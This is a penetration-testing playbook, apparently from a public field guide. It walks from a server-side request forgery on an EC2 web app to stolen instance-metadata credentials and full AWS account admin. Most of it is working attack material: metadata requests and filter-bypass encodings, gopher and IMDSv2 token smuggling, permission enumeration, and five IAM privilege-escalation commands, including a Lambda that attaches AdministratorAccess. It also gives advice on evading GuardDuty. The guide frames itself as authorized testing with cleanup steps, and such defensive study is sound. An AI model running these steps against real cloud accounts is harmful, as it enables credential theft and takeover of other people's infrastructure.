---
tags:
  - hack-notes
  - playbook
  - aws
  - web
---

# AWS IMDS SSRF to Account Takeover Playbook

> Server-side request forgery in an EC2-hosted web app reaches the instance metadata service, steals the instance-role STS credentials, and a found IAM privesc path is walked to account admin.

> **Attack graph position**
> **Fed by:** [Blind SSRF to Cloud Metadata RCE](Blind%20SSRF%20to%20Cloud%20Metadata%20RCE.md), [Insecure Deserialization to RCE](Insecure%20Deserialization%20to%20RCE.md), [SQL Injection to RCE to Pivot](SQL%20Injection%20to%20RCE%20to%20Pivot.md), [Poisoned CI Pipeline to Cloud Admin](Poisoned%20CI%20Pipeline%20to%20Cloud%20Admin.md), [Kubernetes Pod to Cluster to Cloud](Kubernetes%20Pod%20to%20Cluster%20to%20Cloud.md).
> **Feeds into:** End state: AWS account admin. Converges with [AWS Leaked Key to IAM Privilege Escalation](AWS%20Leaked%20Key%20to%20IAM%20Privilege%20Escalation.md).
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Convert a web SSRF into stolen AWS credentials, then escalate to account administrator |
| Starting position | Unauthenticated or low-priv access to a web app on EC2 (or a container with host IMDS reach) that fetches an attacker-controlled URL |
| End state | `AdministratorAccess` over the AWS account (or de-facto admin via a passable role) |
| Key techniques | T1190 Exploit Public-Facing App, T1552.005 Cloud Instance Metadata API, T1078.004 Cloud Accounts, T1098.003 Additional Cloud Roles |
| Prerequisites | An SSRF primitive that returns or blinds-out a response; instance/task carries an IAM role; that role has at least one privesc primitive |
| Difficulty | Medium (IMDSv1) to High (IMDSv2 enforced, blind SSRF) |
| Noise level | Moderate to Loud (CloudTrail records every STS and IAM call; GuardDuty flags off-VPC credential use) |

## Attack Path
```
Web app SSRF
   |
   v
Hit 169.254.169.254  --- IMDSv1? --> GET creds directly
   |                                      |
   | IMDSv2 only                          |
   v                                      |
Can SSRF set headers / PUT? --no--> DEAD END for IMDS
   |  yes                                 |   pivot:
   v                                      |   - 169.254.170.2 ECS task creds
PUT token -> GET creds <------------------+   - SSRF other internal svc
   |
   v
aws configure (temp creds + session token)
   |
   v
sts get-caller-identity  ->  enumerate-iam / cloudfox / Pacu
   |
   v
Pick privesc primitive
 (PassRole+Lambda/RunInstances | CreatePolicyVersion | AttachUserPolicy | PutUserPolicy | AssumeRole)
   |
   v
Escalate -> AdministratorAccess -> account takeover
```

## Prerequisites and Setup
- A confirmed SSRF in the target app: image/avatar fetchers, webhook senders, URL preview / unfurl, PDF/HTML renderers, XXE-to-SSRF, redirect followers, SSO `redirect_uri` proxies.
- The app must run on EC2 with an attached instance profile, OR in a container that can reach host `169.254.169.254`, OR be an ECS task (use the `169.254.170.2` endpoint instead).
- Local tooling on the operator box:
  - AWS CLI v2 (`aws --version` -> `aws-cli/2.x`).
  - `enumerate-iam` (`pip install enumerate-iam` / the andresriancho repo) for brute-style permission discovery on near-zero-perm keys.
  - `cloudfox` (BishopFox, Go binary) for situational awareness once read perms exist.
  - `pacu` (Rhino Security Labs) for the automated privesc scan + exploit modules.
- A scratch AWS profile name reserved, e.g. `loot`, so you never overwrite real creds.
- OPSEC plan agreed: exfil of EC2 creds off-AWS reliably trips GuardDuty `InstanceCredentialExfiltration.OutsideAWS`. Decide up front whether you proxy API calls through the victim or accept the alert (see OPSEC).

## Walkthrough

### Step 1. Confirm and characterize the SSRF
What and why: prove the app will fetch a URL you control and tell you whether you get the response body (full SSRF) or only timing/status (blind). This decides everything downstream.

Point it at a listener you own first, then at link-local.
```bash
# attacker collaborator / netcat to confirm the app reaches out
nc -lvnp 80
# in the app, set the fetched URL to http://ATTACKER_IP/ssrf-canary
# then aim at the metadata base
```
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: victim.example.com
```
Success signal: the response echoes the metadata directory index (`ami-id`, `hostname`, `iam/`, `instance-id`, ...). If you see that listing, IMDS is reachable. If the app errors on `169.254.169.254`, try the encodings in Step 2.

Decision: if you get the body back, this is full SSRF -> continue to Step 3 or 4. If you only get status/timing, this is blind SSRF; jump to the Variations section (blind exfil) before spending time on credential retrieval.

### Step 2. Beat metadata-IP filters if the literal is blocked
What and why: many SSRF filters blocklist the literal `169.254.169.254`. The link-local address has many equivalent encodings, and DNS rebinding covers allowlist-only filters.
```bash
# decimal, hex, octal, mixed, and IPv6-mapped forms all route to 169.254.169.254
http://2852039166/latest/meta-data/
http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/
http://0251.0376.0251.0376/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://169.254.169.254.nip.io/latest/meta-data/   # only if it resolves the label
# allowlist-only filters: DNS rebind a name you control from a public IP to 169.254.169.254
```
Success signal: one encoding returns the metadata index that the literal would not. Use that encoding for every later request.

### Step 3. IMDSv1 path: grab the role and its credentials directly
What and why: if IMDSv1 is enabled, a plain GET returns the role name and then its STS keys. Newer AWS accounts default new launches to IMDSv2-only (account-level default rolled out 2024), but long-lived and re-enabled instances still serve v1, so always test it.

First read the role name attached to the instance profile:
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: victim.example.com
```
That returns the role name, e.g. `app-server-role`. Then pull its credentials:
```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-server-role HTTP/1.1
Host: victim.example.com
```
Success signal: a JSON blob with `AccessKeyId`, `SecretAccessKey`, `Token`, and `Expiration`. Save all three plus the role name. Skip to Step 5.

Decision: if `/iam/security-credentials/` returns `401 Unauthorized` or the body is blank, the instance is IMDSv2-only. Go to Step 4.

### Step 4. IMDSv2 path: PUT a token, then GET with the token header
What and why: IMDSv2 is session-oriented. You first issue a PUT to `/latest/api/token` carrying `X-aws-ec2-metadata-token-ttl-seconds`, then send the returned token in the `X-aws-ec2-metadata-token` header on every GET. This is only exploitable through SSRF if the SSRF lets you control the HTTP method (PUT) AND set request headers. A simple GET-only `url=` fetcher cannot do it.

If the SSRF supports raw request control (full request smuggling, `gopher://`, a fetch library that honors method/headers):
```http
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
That returns the session token string. Then:
```http
GET /latest/meta-data/iam/security-credentials/app-server-role HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAEA...the-token...
```
Smuggling-friendly forms when the app only takes a single URL:
```bash
# gopher lets you encode a full raw request incl. method + headers in one URL
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP%2F1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a
# h2c request smuggling (BishopFox h2csmuggler) can carry the PUT + token header
# past a front proxy that strips/blocks them
```
Note: IMDSv2 deliberately rejects any token PUT that carries an `X-Forwarded-For` header, which is exactly what an open reverse proxy adds. That is the control that kills most proxy-style SSRF here.

Success signal: same credential JSON (`AccessKeyId` / `SecretAccessKey` / `Token`) as the v1 path.

Decision: IMDSv2 enforced AND the SSRF cannot set headers or method -> IMDS is a dead end. Pivot now: try the ECS task-role endpoint and other internal services (Variations section), do not keep grinding IMDS.

### Step 5. Configure the stolen temporary credentials
What and why: temp creds always include a session token; without `aws_session_token` every call fails with `InvalidClientTokenId`. Load them into an isolated profile.
```bash
aws configure set aws_access_key_id     ASIA...     --profile loot
aws configure set aws_secret_access_key wJalr...     --profile loot
aws configure set aws_session_token     IQoJb3JpZ2lu... --profile loot
aws configure set region                us-east-1   --profile loot
```
Or export them for one-off use:
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=wJalr...
export AWS_SESSION_TOKEN=IQoJb3JpZ2lu...
export AWS_DEFAULT_REGION=us-east-1
```
Success signal: no error on the next call.

### Step 6. Confirm identity
What and why: prove the creds work and learn the principal ARN and account id. This is the loudest single call (`sts:GetCallerIdentity` is logged), but you need it.
```bash
aws sts get-caller-identity --profile loot
```
Success signal:
```json
{
  "UserId": "AROA...:i-0abc...",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/app-server-role/i-0abc..."
}
```
The `assumed-role/.../i-...` shape confirms these are instance-role creds. Note the account id and role name.

### Step 7. Enumerate the role's permissions
What and why: you must know what the role can actually do before choosing a privesc primitive. Three tools, escalating in noise and depth.

Fast, low-footprint brute of allowed actions (good when the role can't even list its own policies):
```bash
enumerate-iam --access-key ASIA... --secret-key wJalr... --session-token IQoJ... --region us-east-1
```
Situational awareness once the role has any read/list perms:
```bash
cloudfox aws -p loot all-checks
# focused: who am I, and what can each principal do
cloudfox aws -p loot permissions
cloudfox aws -p loot principals
cloudfox aws aws -p loot endpoints   # reachable service endpoints / lateral surface
```
If the role can read IAM, pull its own policy directly:
```bash
aws iam list-attached-role-policies --role-name app-server-role --profile loot
aws iam list-role-policies          --role-name app-server-role --profile loot
aws iam get-role-policy --role-name app-server-role --policy-name inline-pol --profile loot
```
Success signal: a concrete action list. Scan it for any of: `iam:PassRole`, `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:AttachRolePolicy`, `iam:PutUserPolicy`/`PutRolePolicy`, `iam:CreateAccessKey`, `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole`, `lambda:CreateFunction`+`lambda:InvokeFunction`, `ec2:RunInstances`, `glue:*`, `cloudformation:*`, `ssm:SendCommand`.

### Step 8. Let Pacu map and rank the privesc paths
What and why: Pacu's `iam__privesc_scan` enumerates the principal's permissions and reports (and optionally runs) every escalation path it recognizes. Use it to confirm the manual read before you act.
```bash
pacu
# inside the pacu shell:
set_keys                 # paste access key / secret / session token, name it "loot"
run iam__enum_permissions
run iam__privesc_scan    # add --offline to only report, no live changes
```
Success signal: Pacu prints "Privilege escalation path found" with the method name (e.g. `PassExistingRoleToNewLambdaThenInvoke`, `CreateNewPolicyVersion`, `AttachUserPolicy`). That names your primitive.

### Step 9. Walk the chosen privesc primitive to admin
What and why: execute exactly one primitive cleanly. Pick by what Step 7/8 found. Each ends with admin or with a more-privileged session.

Primitive A, `iam:CreatePolicyVersion` (cleanest if the role's own policy is customer-managed): set a new default version that grants `*:*`.
```bash
cat > admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/app-server-policy \
  --policy-document file://admin.json \
  --set-as-default --profile loot
# --set-as-default applies even without iam:SetDefaultPolicyVersion
```

Primitive B, `iam:AttachUserPolicy` / `AttachRolePolicy`: bolt `AdministratorAccess` straight onto a principal you control.
```bash
aws iam attach-user-policy --user-name CONTROLLED_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile loot
# role variant:
aws iam attach-role-policy --role-name app-server-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile loot
```

Primitive C, `iam:PutUserPolicy`: inline an admin statement (no managed-policy attach perm needed).
```bash
aws iam put-user-policy --user-name CONTROLLED_USER --policy-name esc \
  --policy-document file://admin.json --profile loot
```

Primitive D, `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`: pass an existing high-priv role to a Lambda you create, then run code as that role. Requires a passable role whose ARN you can read (`aws iam list-roles`).
```bash
# minimal handler that uses its own (high-priv) execution-role creds
cat > h.py <<'EOF'
import boto3
def handler(e,c):
    iam=boto3.client('iam')
    iam.attach_user_policy(UserName='CONTROLLED_USER',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return 'ok'
EOF
zip f.zip h.py
aws lambda create-function --function-name esc \
  --runtime python3.12 --handler h.handler \
  --role arn:aws:iam::123456789012:role/HIGH_PRIV_ROLE \
  --zip-file fileb://f.zip --profile loot
aws lambda invoke --function-name esc out.json --profile loot
```

Primitive E, `iam:PassRole` + `ec2:RunInstances`: launch an instance with a privileged instance profile, then read that role's creds from its own IMDS (repeat Step 3/4 against the new box, which you control end to end).
```bash
aws ec2 run-instances --image-id ami-0abc123 --instance-type t3.micro \
  --iam-instance-profile Name=HIGH_PRIV_PROFILE \
  --key-name YOUR_KEY --profile loot
```
Success signal across all primitives: re-run an admin-only probe and it works.
```bash
aws iam attach-user-policy --user-name probe --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess --profile loot && echo "admin confirmed"
# or simply:
aws iam list-users --profile loot   # was previously denied, now returns
```

Decision: if none of the recognized primitives apply (role is genuinely least-privilege), do not force it. Treat the creds as a lateral foothold (read S3/Secrets/SSM Parameter Store, assume any reachable role) and pivot. See Variations.

### Step 10. Establish controlled access and stop
What and why: with admin, mint one durable handle for the report, then stop. Do not start trashing the account.
```bash
# console session from the temp creds (aws-consoler) for a screenshot of admin
pip install aws-consoler
aws_consoler -a ASIA... -s wJalr... -t IQoJ...   # prints a federated console URL
```
Stop at the proven primitive. Record the admin proof, then proceed to Cleanup.

## OPSEC and Detection
- Every API call you make is a CloudTrail event with `sourceIPAddress` and `userAgent`. The instant you call AWS from your own box with the stolen creds, CloudTrail shows `app-server-role` calling from a non-instance IP with a CLI/`Boto3`/`enumerate-iam` user-agent. That `sourceIPAddress`/role mismatch is the single clearest IOC.
- `sts:GetCallerIdentity` (Step 6), the `enumerate-iam` brute (hundreds of `*:Describe*`/`*:List*` AccessDenied events in seconds), and the IAM write calls (`CreatePolicyVersion`, `AttachUserPolicy`, `CreateFunction`) are all high-signal. `enumerate-iam`'s denied-call storm is itself an anomaly.
- GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` fires when EC2 role creds are used from outside AWS; `...InsideAWS` fires when they are used from a different AWS account. Either way, using instance creds off the instance is the textbook trigger.
- GuardDuty also has anomaly findings for IAM principals doing unusual API calls and for credential use outside the expected VPC. Mature shops alert on `CreatePolicyVersion --set-as-default` and `AttachUserPolicy AdministratorAccess` specifically.
- Noise reduction (only within authorized rules of engagement):
  - Make API calls from inside AWS, ideally proxied through the victim instance (SSM/SSRF tunnel), so the source IP stays AWS-internal and avoids the `OutsideAWS` finding.
  - Match the expected region and a plausible user-agent; do the minimum enumeration (prefer reading the role's own policy over an `enumerate-iam` brute).
  - Move fast: instance creds rotate and expire (`Expiration` in the JSON), and short windows reduce exposure.

## Cleanup
Revert everything created, newest first, so dependencies unwind cleanly:
- Lambda (Primitive D): `aws lambda delete-function --function-name esc --profile loot`.
- EC2 (Primitive E): `aws ec2 terminate-instances --instance-ids i-0newbox --profile loot`.
- Policy version (Primitive A): delete the rogue version and restore the prior default.
  ```bash
  aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/app-server-policy --profile loot
  aws iam set-default-policy-version --policy-arn ...:policy/app-server-policy --version-id v1 --profile loot
  aws iam delete-policy-version      --policy-arn ...:policy/app-server-policy --version-id vN --profile loot
  ```
- Attached managed policy (Primitive B): `aws iam detach-user-policy --user-name CONTROLLED_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile loot` (and the role variant).
- Inline policy (Primitive C): `aws iam delete-user-policy --user-name CONTROLLED_USER --policy-name esc --profile loot`.
- Any access keys minted: `aws iam delete-access-key --user-name USER --access-key-id AKIA... --profile loot`.
- Local artifacts: delete `admin.json`, `h.py`, `f.zip`, `out.json`, the `loot` profile from `~/.aws/credentials` and `~/.aws/config`, and any captured federated console URL.
- Note remaining CloudTrail/GuardDuty evidence in the report; you cannot and should not erase logs.

## Troubleshooting
- `InvalidClientTokenId` / `The security token included in the request is invalid`: you omitted `aws_session_token`, or it expired. Re-pull creds from IMDS (check the `Expiration` field; instance creds rotate, often hourly) and re-`aws configure`.
- IMDSv2 token PUT returns `403` or empty: the SSRF cannot set the method/header, or it injected an `X-Forwarded-For` (IMDS rejects token PUTs carrying it). Confirm raw request control or pivot off IMDS.
- `/iam/security-credentials/` is empty with no error: the instance has no role attached. There are no creds to steal here; the SSRF value is reaching other internal services, not IMDS.
- Wrong-region errors (`AuthFailure`, endpoint not resolvable): set the region to match the instance. Read it from IMDS: `.../latest/meta-data/placement/region`.
- Creds work but every IAM/STS call is `AccessDenied`: the role is genuinely least-privilege. Stop hunting privesc; treat it as a data/lateral foothold (S3, Secrets Manager, SSM params, `sts:AssumeRole` to reachable roles).
- `cloudfox`/Pacu error on assumed-role creds: ensure all three values (key, secret, token) are set; some versions need `AWS_SESSION_TOKEN` exported even when a profile is configured.
- `enumerate-iam` returns nothing: the role denies even `Describe`/`List`; fall back to reading the role's own attached policy if `iam:Get*` is allowed, or just probe specific suspected actions.

## Variations and Pivots
- ECS task role (no EC2 IMDS): the host may enforce IMDSv2 or block link-local, but ECS tasks fetch creds from `http://169.254.170.2` plus the per-task path in `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (often `/v2/credentials/<uuid>`). If SSRF runs inside a task, hit `http://169.254.170.2/v2/credentials/<uuid>` (or read the env var first) to get task-role creds with no PUT/token dance. Note the 2025 "ECScape" research on cross-task credential exposure on ECS-on-EC2 for lateral movement between co-located tasks.
- Blind SSRF: you cannot read the metadata body. Use the app as a relay: many fetchers will POST/forward the fetched content to a webhook or render it into a returned file (PDF/screenshot), exfiltrating the creds indirectly. Or trigger a request whose differential timing/error leaks one bit at a time.
- IMDSv2 enforced and headerless SSRF: dead end for IMDS. Pivot the SSRF to other internal services: internal admin panels, Redis/Elasticsearch on `localhost`, `link-local` Kubernetes API, internal S3-style endpoints, or `gopher://` to backend protocols.
- EKS/Kubernetes on EC2: from a pod, IMDS reach yields the node role; chain into the cluster via the node role's `eks`/`ec2` perms. See [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md).
- Escalations from admin: enumerate and loot Secrets Manager, SSM Parameter Store, S3, RDS snapshots, and set persistence (new IAM user + access key, role trust-policy backdoor) only if the engagement authorizes it. Map the full path with Vinculum.
- Container/host context for the SSRF foothold pairs with [Blind SSRF to Cloud Metadata RCE](Blind%20SSRF%20to%20Cloud%20Metadata%20RCE.md) when the metadata reach can be driven to code execution rather than only credential theft.

## Related
- [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md)
- [AWS Pentest](../Cheatsheets/AWS%20Pentest.md)
- [Web Application](../Checklists/Web%20Application.md)
- [Blind SSRF to Cloud Metadata RCE](Blind%20SSRF%20to%20Cloud%20Metadata%20RCE.md)
- Vinculum

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
